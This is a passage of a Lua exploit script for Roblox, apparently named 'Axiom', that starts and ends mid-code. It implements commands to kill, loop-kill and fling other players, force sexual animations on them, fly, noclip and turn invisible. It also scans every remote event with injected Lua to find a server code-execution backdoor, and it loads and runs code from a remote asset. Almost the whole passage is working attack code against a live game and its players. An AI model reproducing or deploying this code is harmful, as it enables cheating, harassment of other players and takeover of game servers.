				root.AssemblyLinearVelocity = Vector3.zero
				root.AssemblyAngularVelocity = Vector3.zero
				getChar():WaitForChild("HumanoidRootPart").CFrame = old
				return
			end
			if not targetHead.Parent or not anchor.Parent then
				StopWeldFling()
				local root = getChar():WaitForChild("HumanoidRootPart")
				root.AssemblyLinearVelocity = Vector3.zero
				root.AssemblyAngularVelocity = Vector3.zero
				getChar():WaitForChild("HumanoidRootPart").CFrame = old
				return
			end

			local desiredTorsoCFrame = anchor.CFrame
			hrp.CFrame = desiredTorsoCFrame * torsoOffsetFromHRP:Inverse()
			hrp.AssemblyLinearVelocity = velocity
			if allowautoeject and anchor.AssemblyLinearVelocity.Magnitude > (velocity.Magnitude / 2) then 
				StopWeldFling()
			end
		end)

		HeadSitState.JumpConnection = humanoid.StateChanged:Connect(function(_, newState)
			if newState == Enum.HumanoidStateType.Jumping then
				StopWeldFling()
			end
		end)
	end
	function DestroyHumToAttach()
		local charhum = getChar():WaitForChild("Humanoid")
		setHumState(game.Players.LocalPlayer.Character.Humanoid, Enum.HumanoidStateType.GettingUp, true)
		setHumState(game.Players.LocalPlayer.Character.Humanoid, Enum.HumanoidStateType.Landed, true)
		setHumState(game.Players.LocalPlayer.Character.Humanoid, Enum.HumanoidStateType.Running, true)
		game:GetService("RunService").PreRender:Wait()
		charhum.Name = "1"
		local l = game.Players.LocalPlayer.Character["1"]:Clone()
		l.Parent = game.Players.LocalPlayer.Character
		l.Name = "Humanoid"
		game:GetService("RunService").PreRender:Wait()
		game.Players.LocalPlayer.Character["1"]:Destroy()
		game.Workspace.CurrentCamera.CameraSubject = game.Players.LocalPlayer.Character
		game:GetService("RunService").PreRender:Wait()
		local removeParts = {
			LeftUpperArm = true,
			RightUpperLeg = true,
			LeftUpperLeg = true,
			["Left Arm"] = true,
			["Left Leg"] = true,
			["Right Leg"] = true,
		}
		for _, part in ipairs(game.Players.LocalPlayer.Character:GetDescendants()) do
			if part:IsA("BasePart") and removeParts[part.Name] then
				part:Destroy()
				continue
			end
			if part:IsA("BasePart") then
				part.CustomPhysicalProperties = PhysicalProperties.new(
					900, 
					0.3,
					0.5,
					1,
					1 
				)
			end
		end
		disableatoolnim()
		game.Players.LocalPlayer.Character.Humanoid.DisplayDistanceType = "None"
		setHumState(game.Players.LocalPlayer.Character.Humanoid, Enum.HumanoidStateType.GettingUp, true)
		setHumState(game.Players.LocalPlayer.Character.Humanoid, Enum.HumanoidStateType.Landed, true)
		setHumState(game.Players.LocalPlayer.Character.Humanoid, Enum.HumanoidStateType.Running, true)
		local gyro = Instance.new("BodyGyro")
		gyro.MaxTorque = Vector3.new(1e9,1e9,1e9)
		gyro.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
		gyro.Parent = game.Players.LocalPlayer.Character.HumanoidRootPart
		game:GetService("RunService").PreRender:Wait()
	end
	function claim(tar)
		local oldchar = getChar()
		local charhum = game.Players.LocalPlayer.Character:WaitForChild("Humanoid")
		game.Players.LocalPlayer.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.GettingUp, true)
		game.Players.LocalPlayer.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Landed, true)
		game.Players.LocalPlayer.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Running, true)
		game:GetService("RunService").PreRender:Wait()
		charhum.Name = "1"
		local l = game.Players.LocalPlayer.Character["1"]:Clone()
		l.Parent = game.Players.LocalPlayer.Character
		l.Name = "Humanoid"
		game:GetService("RunService").PreRender:Wait()
		game.Players.LocalPlayer.Character["1"]:Destroy()
		game.Workspace.CurrentCamera.CameraSubject = game.Players.LocalPlayer.Character
		game.Players.LocalPlayer.Character.Animate.Disabled = true
		game:GetService("RunService").PreRender:Wait()
		local removeParts = {
			LeftUpperArm = true,
			RightUpperLeg = true,
			LeftUpperLeg = true,
			["Left Arm"] = true,
			["Left Leg"] = true,
			["Right Leg"] = true,
		}
		for _, part in ipairs(game.Players.LocalPlayer.Character:GetDescendants()) do
			if part:IsA("BasePart") and removeParts[part.Name] then
				part:Destroy()
				continue
			end
			if part:IsA("BasePart") then
				part.CustomPhysicalProperties = PhysicalProperties.new(
					900, 
					0.3,
					0.5,
					1,
					1 
				)
			end
		end
		game.Players.LocalPlayer.Character.Animate.Disabled = false
		game.Players.LocalPlayer.Character.Humanoid.DisplayDistanceType = "None"
		for i = 1, 15 do 
			game.Players.LocalPlayer.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.GettingUp, true)
			game.Players.LocalPlayer.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Landed, true)
			game.Players.LocalPlayer.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Running, true)
		end
		local gyro = Instance.new("BodyGyro")
		gyro.MaxTorque = Vector3.new(1e9,1e9,1e9)
		gyro.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
		gyro.Parent = game.Players.LocalPlayer.Character.HumanoidRootPart
		game:GetService("RunService").PreRender:Wait()

		local tool = getChar():FindFirstChildOfClass("Tool") or getBp():FindFirstChildOfClass("Tool") or nil
		if tool == nil then notice("Axiom prevent a command from running due to: tool == nil") return end
		if tool.Parent == getBp() then
			tool.Parent = getChar()
		end
		game:GetService("RunService").PreRender:Wait()
		repeat 
			globalLib.firetouchinterest(tool.Handle,tar.Character.HumanoidRootPart,0)
		until tool.Parent == tar.Character or tool == nil
		game:GetService("RunService").PreRender:Wait()
		plr.Character = tar.Character
		return oldchar
	end
	local netsleepTargets = {}
	local nsLoop
	nsLoop = game:GetService("RunService").Stepped:Connect(function()
		if #netsleepTargets == 0 then return end
		for i,v in pairs(netsleepTargets) do
			if v.Character then
				for i,v in pairs(v.Character:GetChildren()) do
					if v:IsA("BasePart") == false and v:IsA("Accessory") == false then continue end
					if v:IsA("BasePart") then
						sethiddenproperty(v,"NetworkIsSleeping",true)
					elseif v:IsA("Accessory") and v:FindFirstChild("Handle") then
						sethiddenproperty(v.Handle,"NetworkIsSleeping",true)
					end
				end
			end
		end
	end)
	local bangLoop
	local bangDied
	local bangAnim
	local bang
	function bang(target, speed)
		if bangDied then
			bangDied:Disconnect()
			bang:Stop()
			bangAnim:Destroy()
			bangLoop:Disconnect()
		end
		local humanoid = plr.Character:FindFirstChildWhichIsA("Humanoid")
		bangAnim = Instance.new("Animation")
		if plr.Character.Humanoid.RigType == Enum.HumanoidRigType.R15 then
			bangAnim.AnimationId = "rbxassetid://5918726674" 
		else
			bangAnim.AnimationId = "rbxassetid://148840371"
		end
		bang = humanoid:LoadAnimation(bangAnim)
		bang:Play(0.1, 1, 1)
		bang:AdjustSpeed(speed or 3)
		bangDied = humanoid.Died:Connect(function()
			bang:Stop()
			bangAnim:Destroy()
			bangDied:Disconnect()
			bangLoop:Disconnect()
		end)
		local bangOffet = CFrame.new(0, 0, 1.1)
		notice("Banging "..target.Name..".")
		bangLoop = game:GetService("RunService").Stepped:Connect(function()
			pcall(function()
				if target.Character.Humanoid.RigType == Enum.HumanoidRigType.R15 then
					local otherRoot = target.Character.UpperTorso
					plr.Character.HumanoidRootPart.CFrame = otherRoot.CFrame * bangOffet
				else
					local otherRoot = target.Character.Torso
					plr.Character.HumanoidRootPart.CFrame = otherRoot.CFrame * bangOffet
				end
				glue(target, true)
			end)
		end)
	end
	function kill(target)
		repeat game:GetService("RunService").PreRender:Wait() until not target.Character:FindFirstChild("ForceField")
		local tool = getBp():FindFirstChildOfClass("Tool") or getChar():FindFirstChildOfClass("Tool")
		if not tool or not tool:FindFirstChild("Handle") then
			notice("Axiom prevent a command from running due to: No tool found on your player")
			return
		end

		local char = plr.Character
		local hum = char and char:FindFirstChild("Humanoid")
		local targetChar = target.Character
		local targetHum = targetChar and targetChar:FindFirstChild("Humanoid")
		local targetRoot = targetChar and targetChar:FindFirstChild("HumanoidRootPart")

		if chechifalive(getChar()) == false then notice("Axiom prevent a command from running due to: You Are Dead") return end
		if hum.Sit then
			notice("Axiom prevent a command from running due to: Your player is sitting")
			return
		end
		if chechifalive(target.Character) == false then notice("Axiom prevent a command from running due to: Target Is Dead") return end

		local originalGrip   = tool.Grip
		local originalShape  = tool.Handle.Shape
		local originalSize   = tool.Handle.Size

		local toolGUI
		local hotbar = game:GetService("CoreGui")
			:FindFirstChild("RobloxGui")
			and game:GetService("CoreGui").RobloxGui
			:FindFirstChild("Backpack")
			and game:GetService("CoreGui").RobloxGui.Backpack
			:FindFirstChild("Hotbar")

		if hotbar then
			for _, v in pairs(hotbar:GetDescendants()) do
				local nameLabel = v:FindFirstChild("ToolName")
				if nameLabel and nameLabel.Text == tool.Name then
					toolGUI = v
					break
				end
			end
		end

		tool.Handle.Massless = true
		tool.Grip = CFrame.new(0, 9900, 0)
		tool.Handle.Shape = Enum.PartType.Ball
		tool.Handle.Size = Vector3.new(10, 10, 10)
		tool.Enabled = false
		tool.Parent = char

		disableatoolnim()

		if toolGUI then
			local eq = toolGUI:FindFirstChild("Equipped")
			if eq then eq.Visible = false end
		end

		repeat
			targetChar = target.Character
			targetHum  = targetChar and targetChar:FindFirstChild("Humanoid")
			targetRoot = targetChar and targetChar:FindFirstChild("HumanoidRootPart")

			if not targetHum or not targetRoot or targetHum.Health <= 0 then break end
			if hum.Health <= 0 then break end

			local handle = tool:FindFirstChild("Handle")
			if not handle then break end
			stopsoundinobj(handle)

			globalLib.firetouchinterest(targetRoot, handle, 1)
			globalLib.firetouchinterest(targetRoot, handle, 0)

			game:GetService("RunService").PreRender:Wait()
		until (targetHum and targetHum.Health <= 0) or hum.Health <= 0

		tool.Enabled         = true
		tool.Handle.Shape    = originalShape
		tool.Handle.Size     = originalSize
		tool.Grip            = originalGrip

		enabletoolanim()
		stopsoundinobj(tool.Handle)

		if toolGUI then
			local eq = toolGUI:FindFirstChild("Equipped")
			if eq then eq.Visible = true end
		end

		getChar():FindFirstChildOfClass("Humanoid"):UnequipTools()
	end
	local RunService = game:GetService("RunService")

	local flying = false
	local speed = 120
	local smooth = 0.15
	local movement = {W = 0, S = 0, A = 0, D = 0}
	local flightConn = nil
	local bodyVelocity, bodyGyro = nil, nil

	local function getCharst()
		local char = plr.Character or plr.CharacterAdded:Wait()
		local root = char:WaitForChild("HumanoidRootPart")
		local hum = char:FindFirstChildOfClass("Humanoid")
		return char, root, hum
	end

	local function cleanupMotors(root)
		for _, name in ipairs({"flyVelocity", "flyGyro"}) do
			local obj = root:FindFirstChild(name)
			if obj then obj:Destroy() end
		end
		bodyVelocity = nil
		bodyGyro = nil
	end

	local function createMotors(root)
		cleanupMotors(root)

		bodyVelocity = Instance.new("BodyVelocity")
		bodyVelocity.Name = "flyVelocity"
		bodyVelocity.MaxForce = Vector3.new(9e9, 9e9, 9e9)
		bodyVelocity.Velocity = Vector3.zero
		bodyVelocity.Parent = root

		bodyGyro = Instance.new("BodyGyro")
		bodyGyro.Name = "flyGyro"
		bodyGyro.P = 1e5
		bodyGyro.D = 500
		bodyGyro.MaxTorque = Vector3.new(9e9, 9e9, 9e9)
		bodyGyro.CFrame = root.CFrame
		bodyGyro.Parent = root
	end

	function StartFly(newSpeed)
		if flying then return end
		flying = true
		tempdisableantifling = true
		if newSpeed then speed = newSpeed end

		local char, root, hum = getCharst()
		if hum then hum.PlatformStand = true end

		createMotors(root)

		local currentVel = Vector3.zero
		local cam = workspace.CurrentCamera

		flightConn = RunService.RenderStepped:Connect(function(dt)
			if not flying then return end

			local _, root, hum = getCharst()
			if not root then return end
			cam = workspace.CurrentCamera

			local direction =
				(cam.CFrame.LookVector * (movement.W - movement.S)) +
				(cam.CFrame.RightVector * (movement.D - movement.A))

			if direction.Magnitude > 1 then
				direction = direction.Unit
			end

			local targetVel = direction * speed
			currentVel = currentVel:Lerp(targetVel, smooth)

			if bodyVelocity then
				bodyVelocity.Velocity = currentVel
			end

			if bodyGyro then
				bodyGyro.CFrame = CFrame.new(root.Position, root.Position + cam.CFrame.LookVector)
			end
		end)
	end

	function StopFly()
		if not flying then return end
		flying = false
		tempdisableantifling = false
		if flightConn then
			flightConn:Disconnect()
			flightConn = nil
		end

		local char, root, hum = getCharst()
		if root then cleanupMotors(root) end
		if hum then hum.PlatformStand = false end

		movement = {W = 0, S = 0, A = 0, D = 0}
	end
	
	UserInputService.InputBegan:Connect(function(input, gp)
		if gp then return end
		if input.KeyCode == Enum.KeyCode.W then movement.W = 1 end
		if input.KeyCode == Enum.KeyCode.S then movement.S = 1 end
		if input.KeyCode == Enum.KeyCode.A then movement.A = 1 end
		if input.KeyCode == Enum.KeyCode.D then movement.D = 1 end
	end)

	UserInputService.InputEnded:Connect(function(input)
		if input.KeyCode == Enum.KeyCode.W then movement.W = 0 end
		if input.KeyCode == Enum.KeyCode.S then movement.S = 0 end
		if input.KeyCode == Enum.KeyCode.A then movement.A = 0 end
		if input.KeyCode == Enum.KeyCode.D then movement.D = 0 end
	end)

	local backdoor = nil
	function runRemote(r, ...)
		if r:IsA("RemoteEvent") then
			return task.spawn(r.FireServer, r, ...);
		elseif r:IsA("RemoteFunction") then
			return task.spawn(r.InvokeServer, r, ...);
		end
	end
	function filterTheThing(r)
		if r:IsA("RemoteEvent") or r:IsA("RemoteFunction") then
			if string.split(r:GetFullName(), '.')[1]=='RobloxReplicatedStorage' then
				return false
			end
			if r:FindFirstChild("__FUNCTION") or r.Name == "__FUNCTION" then
				return false
			end
			if r.Parent and r.Parent.Parent and r.Parent.Parent.Name == "HDAdminClient" then
				return false
			end
			if r.Parent and r.Parent.Name == "Signals" then
				return false
			end
			if r.Parent and r.Parent.Name == "DefaultChatSystemChatEvents" then
				return false
			end
			return true
		end
		return false
	end
	function MultiBackdoorChecker()
		local timee=os.clock()
		local foundremotes = {}
		for i,remote in game:GetDescendants() do
			if filterTheThing(remote) then
				table.insert(foundremotes, remote);
			end
		end
		for i, r in ipairs(foundremotes) do
			runRemote(r, "local a = Instance.new('Model',workspace)a.Name='Axiom'")
			task.wait(0.2)
			if workspace:FindFirstChild("Axiom") then
				backdoor=r
				print("checked "..r.Parent.Name.."/"..r.Name.." returned true")
				runRemote(r, "workspace:FindFirstChild('Axiom'):Destroy()")
				return true
			end
			print("checked "..r.Parent.Name.."/"..r.Name.." returned false")
		end
		return false
	end

	local camera = workspace.CurrentCamera

	local realChar
	local fakeChar
	local isInvisible = false

	local skyPosition = Vector3.new(0, 1000000, 0)
	local skyPlatform

	local function setCharacterVisibility(char, isVisible)
		local targetTransparency = isVisible and 0 or 1
		for _, obj in ipairs(char:GetDescendants()) do
			if obj:IsA("BasePart") and obj.Name ~= "HumanoidRootPart" then
				obj.Transparency = targetTransparency
			elseif obj:IsA("Decal") then
				obj.Transparency = targetTransparency
			end
		end
	end

	local function makeFakeCharacter(charToClone, targetCFrame)
		charToClone.Archivable = true
		local clone = charToClone:Clone()
		clone.Name = "FakeCharacter"

		for _, obj in ipairs(clone:GetDescendants()) do
			if obj:IsA("BasePart") then
				obj.Anchored = false 
				if obj.Name ~= "HumanoidRootPart" then
					obj.Transparency = 0.5
				end
			elseif obj:IsA("Decal") then
				obj.Transparency = 0.5
			end
		end

		clone:PivotTo(targetCFrame)
		clone.Parent = workspace
		return clone
	end

	local function invisible()
		if isInvisible then return end

		realChar = plr.Character
		if not realChar then return end

		local realRoot = realChar:FindFirstChild("HumanoidRootPart")
		if not realRoot then return end

		local savedCFrame = realRoot.CFrame
		
		skyPlatform = Instance.new("Part")
		skyPlatform.Name = "GhostPlatform"
		skyPlatform.Size = Vector3.new(50, 5, 50)
		skyPlatform.Position = skyPosition
		skyPlatform.Anchored = true
		skyPlatform.Transparency = 1 
		skyPlatform.CanCollide = true
		skyPlatform.Parent = workspace

		local teleportCFrame = CFrame.new(skyPosition + Vector3.new(0, 5, 0))
		realChar.HumanoidRootPart.CFrame = teleportCFrame 
		sethiddenproperty(realChar.HumanoidRootPart, "PhysicsRepRootPart", realChar.HumanoidRootPart)
		task.wait(0.15)
		fakeChar = makeFakeCharacter(realChar, savedCFrame)

		realRoot.Anchored = true

		plr.Character = fakeChar
		camera.CameraSubject = fakeChar:FindFirstChildOfClass("Humanoid")

		isInvisible = true
	end

	local function visible()
		if not isInvisible then return end
		if not realChar or not fakeChar then return end

		local realRoot = realChar:FindFirstChild("HumanoidRootPart")
		if not realRoot then return end

		local currentGhostCFrame = fakeChar:GetPivot()

		realChar:PivotTo(currentGhostCFrame)
		
		realRoot.Anchored = false

		plr.Character = realChar
		
		local realHum = realChar:FindFirstChildOfClass("Humanoid")
		if realHum then
			camera.CameraSubject = realHum
		end

		fakeChar:Destroy()
		fakeChar = nil

		skyPlatform:Destroy()
		skyPlatform = nil
		local humanoid = realChar:FindFirstChildOfClass("Humanoid")
		local root = realChar:FindFirstChild("HumanoidRootPart")

		if humanoid then
			humanoid.PlatformStand = false
			humanoid.Sit = false
			humanoid:ChangeState(Enum.HumanoidStateType.GettingUp)
			humanoid:ChangeState(Enum.HumanoidStateType.Running)
		end

		if root then
			root.AssemblyLinearVelocity = Vector3.zero
			root.AssemblyAngularVelocity = Vector3.zero
		end
		isInvisible = false
	end

	local Commands = {
		{
			Name = "Kill",
			Aliases = {"kill"},
			Description = "Kills the target player.",
			Usage = "kill <player>",
			Arguments = {"player"},
			Run = function(args)
				local target = getPlr(args[1])
				for i,v in pairs(target)do
					if #target == 0 then return end
					kill(v)
				end
			end
		},
	
		{
			Name = "LoopKill",
			Aliases = {"loopkill", "lk"},
			Description = "Continuously kills a player.",
			Usage = "loopkill <player>",
			Arguments = {"player"},
			Run = function(args)
				local target = getPlr(args[1])
				for _, plr in ipairs(target) do
					if LoopKills[plr] then return end 

					local running = true
					LoopKills[plr] = function()
						return running
					end

					task.spawn(function()
						while LoopKills[plr] and LoopKills[plr]() do
							if chechifalive(plr.Character) then
								kill(plr)
							end
							task.wait(0.5)
						end
					end)
				end
			end
		},
	
		{
			Name = "UnLoopKill",
			Aliases = {"unloopkill", "unlk"},
			Description = "Stops loop killing.",
			Usage = "unloopkill",
			Arguments = {},
			Run = function(args)
				local targets = getPlr(args[1])

				for _, plr in ipairs(targets) do
					if LoopKills[plr] then
						LoopKills[plr] = nil
					end
				end
			end
		},
	
		{
			Name = "Fly",
			Aliases = {"fly"},
			Description = "Enables flying.",
			Usage = "fly <speed>",
			Arguments = {"speed"},
			Run = function(args)
				local speed = tonumber(args[1]) or 120
				StartFly()
			end
		},
	
		{
			Name = "UnFly",
			Aliases = {"unfly"},
			Description = "Disables flying.",
			Usage = "unfly",
			Arguments = {},
			Run = function(args)
				StopFly()
			end
		},
	
		{
			Name = "ClickKill",
			Aliases = {"clickkill"},
			Description = "Kills whatever you click.",
			Usage = "clickkill",
			Arguments = {},
			Run = function(args)
				if clickkillmove then
					clickkillmove:Disconnect()
					clickkillmove = nil
					wait()
				end
				if killonclick then
					killonclick:Disconnect()
					killonclick = nil
					wait()
				end
				
				local Mouse = plr:GetMouse()

				local currentSelPlr = nil
				local highlightInstance = nil
				local cspn = nil

				local function createHighlight(part)
					if highlightInstance then
						highlightInstance:Destroy()
					end
					highlightInstance = Instance.new("Highlight")
					highlightInstance.FillTransparency = 0.75
					highlightInstance.OutlineTransparency = 0
					highlightInstance.Parent = part
				end

				local function removeHighlight()
					if highlightInstance then
						highlightInstance:Destroy()
						highlightInstance = nil
					end
				end

				clickkillmove = Mouse.Move:Connect(function()
					local target = Mouse.Target
					if target and target.Parent:FindFirstChild("Humanoid") and target.Parent:FindFirstChild("HumanoidRootPart") then
						if currentSelPlr == nil then
							currentSelPlr = target.Parent
							cspn = currentSelPlr.Name
							createHighlight(currentSelPlr)
						end
					else
						currentSelPlr = nil
						removeHighlight()
					end
				end)

				killonclick = UserInputService.InputBegan:Connect(function(input, processed)
					if processed then return end
					if input.UserInputType == Enum.UserInputType.MouseButton1 then
						if currentSelPlr then
							local target = getPlr(cspn:lower())
							for i,v in pairs(target)do
								if #target == 0 then return end
								kill(v)
							end
						end
					end
				end)
			end
		},
	
		{
			Name = "UnClickKill",
			Aliases = {"unclickkill"},
			Description = "Stops click killing.",
			Usage = "unclickkill",
			Arguments = {},
			Run = function(args)
				if clickkillmove then
					clickkillmove:Disconnect()
					clickkillmove = nil
				end
				if killonclick then
					killonclick:Disconnect()
					killonclick = nil
				end
			end
		},
	
		{
			Name = "Invisible",
			Aliases = {"invisible", "invis"},
			Description = "Makes your character invisible.",
			Usage = "invisible",
			Arguments = {},
			Run = function(args)
				invisible()
			end
		},
	
		{
			Name = "Visible",
			Aliases = {"visible", "vis"},
			Description = "Makes your character visible.",
			Usage = "visible",
			Arguments = {},
			Run = function(args)
				visible()
			end
		},
	
		{
			Name = "F3X",
			Aliases = {"f3x"},
			Description = "Gives f3x's building tools.",
			Usage = "f3x",
			Arguments = {},
			Run = function(args)
				loadstring(game:GetObjects("rbxassetid://6695644299")[1].Source)()
			end
		},
		{
			Name = "BuildingTools",
			Aliases = {"buildingtools","btools"},
			Description = "Gives roblox building tools.",
			Usage = "buildingtools",
			Arguments = {},
			Run = function(args)
				local moveTool = Instance.new("HopperBin")
				moveTool.BinType = Enum.BinType.GameTool
				moveTool.Parent = getBp()

				local cloneTool = Instance.new("HopperBin")
				cloneTool.BinType = Enum.BinType.Clone
				cloneTool.Parent = getBp()

				local deleteTool = Instance.new("HopperBin")
				deleteTool.BinType = Enum.BinType.Hammer
				deleteTool.Parent = getBp()
			end
		},
		{
			Name = "NoClip",
			Aliases = {"noclip"},
			Description = "Walk through objects.",
			Usage = "noclip",
			Arguments = {},
			Run = function(args)
				nc = true
			end
		},
	
		{
			Name = "Clip",
			Aliases = {"clip"},
			Description = "Restores collisions.",
			Usage = "clip",
			Arguments = {},
			Run = function(args)
				nc = false
			end
		},
		{
			Name = "SuperFling",
			Aliases = {"superfling", "superthrow"},
			Description = "Powerful fling on a player.",
			Usage = "superfling <player>",
			Arguments = {"player"},
			Run = function(args)
				local target = getPlr(args[1])
				for i,v in pairs(target)do
					if #target == 0 then return end
					fling(v,45, 0.29)
				end
			end
		},
	
		{
			Name = "View",
			Aliases = {"view", "watch"},
			Description = "View a player's character.",
			Usage = "view <player>",
			Arguments = {"player"},
			Run = function(args)
				local target = getPlr(args[1])
				for i,v in pairs(target)do
					if #target == 0 then return end
					workspace.CurrentCamera.CameraSubject = v.Character.Humanoid
				end

			end
		},
	
		{
			Name = "UnView",
			Aliases = {"unview", "unwatch"},
			Description = "Stop viewing players.",
			Usage = "unview",
			Arguments = {},
			Run = function(args)
				workspace.CurrentCamera.CameraSubject = plr.Character.Humanoid
			end
		},
	
		{
			Name = "HipHeight",
			Aliases = {"hipheight"},
			Description = "Changes hip height.",
			Usage = "hipheight <value>",
			Arguments = {"value"},
			Run = function(args)
				local val = tonumber(args[1]) or 10
				getChar().Humanoid.HipHeight = val
			end
		},
	
		{
			Name = "JumpPower",
			Aliases = {"jumppower"},
			Description = "Changes jump power.",
			Usage = "jumppower <value>",
			Arguments = {"value"},
			Run = function(args)
				local val = tonumber(args[1]) or 10
				getChar().Humanoid.JumpPower = val
			end
		},
	
		{
			Name = "WalkSpeed",
			Aliases = {"walkspeed"},
			Description = "Changes walk speed.",
			Usage = "walkspeed <value>",
			Arguments = {"value"},
			Run = function(args)
				local val = tonumber(args[1]) or 10
				getChar().Humanoid.WalkSpeed = val 
			end
		},
	
		{
			Name = "Goto",
			Aliases = {"goto", "tpto", "to"},
			Description = "Teleport to a player.",
			Usage = "goto <player>",
			Arguments = {"player"},
			Run = function(args)
				local target = getPlr(args[1])
				for i,v in pairs(target)do
					if #target == 0 then return end
					tpbypass(v)
				end

			end
		},
	
		{
			Name = "Rejoin",
			Aliases = {"rejoin"},
			Description = "Rejoin the current server.",
			Usage = "rejoin",
			Arguments = {},
			Run = function(args)
				game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId, plr)
			end
		},
	
		{
			Name = "KillAura",
			Aliases = {"killaura", "virus"},
			Description = "Attack nearby players.",
			Usage = "killaura <player> <size>",
			Arguments = {"player", "size"},
			Run = function(args)
				local target = getPlr(args[1])
				local val = tonumber(args[2]) or 10
				for i,v in pairs(target)do
					if #target == 0 then return end
					if killaurapart ~= nil then return end
					killaurapart = Instance.new("Part", workspace)
					killaurapart.CanCollide = false
					killaurapart.Size = Vector3.new(val,val,val)
					killaurapart.Transparency = 0.75
					killaurapart.CFrame = v.Character.HumanoidRootPart.CFrame
					local weld = Instance.new("WeldConstraint")
					weld.Part0 = v.Character.HumanoidRootPart
					weld.Part1 = killaurapart
					weld.Parent = killaurapart

					local function onTouchKA(otherPart)
						local char = otherPart.Parent
						if char and char:FindFirstChild("Humanoid") and not partinka[char] and char:FindFirstChild("Humanoid").Health >= 1 then
							if char.Name == v.Name or char.Name == plr.Name then return end
							partinka[char] = {partinka = partinka}
							print(char.Name.."Touched Kill Aura")
							local targetd = getPlr(char.Name:lower())
							for i,v in pairs(targetd)do
								if #targetd == 0 then return end
								kill(v)
								if v.Character.Health <=0 then partinka[char] = nil end
							end
						end
					end
					killaurapart.Touched:Connect(onTouchKA)
				end

			end
		},
	
		{
			Name = "UnKillAura",
			Aliases = {"unkillaura", "unvirus"},
			Description = "Disable kill aura.",
			Usage = "unkillaura",
			Arguments = {},
			Run = function(args)
				if killaurapart then
					killaurapart:Destroy()
					killaurapart = nil
				end
			end
		},
	
		{
			Name = "Refresh",
			Aliases = {"refresh", "re"},
			Description = "Refreshes your character.",
			Usage = "refresh",
			Arguments = {},
			Run = function(args)
				refresh()
			end
		},

		{
			Name = "Respawn",
			Aliases = {"respawn"},
			Description = "Respawn your character.",
			Usage = "respawn",
			Arguments = {},
			Run = function(args)
				respawn()
			end
		},
	
		{
			Name = "Jump",
			Aliases = {"jump"},
			Description = "Force a player to jump.",
			Usage = "jump <player>",
			Arguments = {"player"},
			Run = function(args)
				local target = getPlr(args[1])
				for i,v in pairs(target)do
					if #target == 0 then return end
					local player = plr
					local character = getChar()
					local lasthrppos = character:FindFirstChild("HumanoidRootPart").CFrame
					local rootPart = character.HumanoidRootPart
					local hum = character.Humanoid

					local speed = 45
					local smoothFactor = 0.02
					local flying = false
					local lastPosition
					local bodyGryro, bodyVelocity

					local function enableFlight()
						bodyGryro = Instance.new("BodyGyro")
						bodyGryro.P = 9e4
						bodyGryro.MaxTorque = Vector3.new(9e9, 9e9, 9e9)
						bodyGryro.Parent = rootPart
						bodyGryro.Name = "bodyGryro"

						bodyVelocity = Instance.new("BodyVelocity")
						bodyVelocity.MaxForce = Vector3.new(9e9, 9e9, 9e9)
						bodyVelocity.Velocity = Vector3.zero
						bodyVelocity.Parent = rootPart
						bodyVelocity.Name = "bodyVelocity"
						hum.PlatformStand = true
						hum.Sit = true
					end
					local function disableFlight()
						if bodyGryro then bodyGryro:Destroy() end
						if bodyVelocity then bodyVelocity:Destroy() end

						if rootPart:FindFirstChild("bodyGryro") then rootPart:FindFirstChild("bodyGryro"):Destroy() end
						if rootPart:FindFirstChild("bodyVelocity") then rootPart:FindFirstChild("bodyVelocity"):Destroy() end
						hum.PlatformStand = false
						hum.Sit = false
					end
					local function startCarpetRide(targetPlayer)
						if flying or not targetPlayer then return end
						local targetCharacter = targetPlayer.Character
						if not targetCharacter then return end

						local targetRoot = targetCharacter:FindFirstChild("HumanoidRootPart")
						if not targetRoot then return end
						local colplren = false
						if targetCharacter.Head.CanCollide then colplren = true end
						if colplren then
							for i,gh in ipairs(targetCharacter:GetDescendants()) do
								if gh:IsA("BasePart") then
									gh.CanCollide = false
								end
							end
						end
						nc = false
						flying = true
						lastPosition = rootPart.CFrame
						enableFlight()
						local currcf = CFrame.new(targetRoot.Position)
						local underPos = currcf.Position - Vector3.new(0,3,0)
						rootPart.CFrame = CFrame.new(underPos)
						bodyVelocity.Velocity = Vector3.zero
						task.wait(0.149)
						currcf = CFrame.new(targetRoot.Position)
						for aa = 0,10 do
							rootPart.CFrame = CFrame.new(currcf.Position + Vector3.new(0,aa,0))
							bodyVelocity.Velocity = Vector3.zero
							task.wait()
						end
						bodyVelocity.Velocity = Vector3.zero
						task.wait(0.1495)
						bodyVelocity.Velocity = Vector3.zero
						nc = true
						flying = false
						disableFlight()
						if colplren then
							for i,gh in ipairs(targetCharacter:GetDescendants()) do
								if gh:IsA("BasePart") then
									gh.CanCollide = true
								end
							end
						end
						getChar():WaitForChild("HumanoidRootPart").CFrame = lasthrppos
					end

					startCarpetRide(v)
				end
			end
		},
	
		{
			Name = "ClickTP",
			Aliases = {"clicktp"},
			Description = "Teleport where you click.",
			Usage = "clicktp",
			Arguments = {},
			Run = function(args)
				local TpTool = Instance.new("Tool")
				TpTool.Name = "Teleport Tool"
				TpTool.RequiresHandle = false
				TpTool.Parent = plr.Backpack
				TpTool.Activated:Connect(function()
					local Char = plr.Character or workspace:FindFirstChild(plr.Name)
					local HRP = Char and Char:FindFirstChild("HumanoidRootPart")
					if not Char or not HRP then
						return warn("Failed to find HumanoidRootPart")
					end
					for i = 0,10 do 
						HRP.CFrame = HRP.CFrame + Vector3.new(math.random(-1,1),math.random(-1,1),math.random(-1,1))
						task.wait()
					end
					HRP.CFrame = CFrame.new(plr:GetMouse().Hit.X, plr:GetMouse().Hit.Y + 3, plr:GetMouse().Hit.Z, select(4, HRP.CFrame:components()))
				end)
			end
		},
	
		{
			Name = "Outline",
			Aliases = {"outline"},
			Description = "Highlight a player.",
			Usage = "outline <player>",
			Arguments = {"player"},
			Run = function(args)
				local target = getPlr(args[1])
				for i,v in pairs(target)do
					if #target == 0 then return end
					if v.Character:FindFirstChild("Highlight") then return end
					local HLI = Instance.new("Highlight")
					HLI.FillColor = Color3.fromRGB(0,255,255)
					HLI.FillTransparency = 0.75
					HLI.Parent = v.Character
				end
			end
		},
	
		{
			Name = "UnOutline",
			Aliases = {"unoutline"},
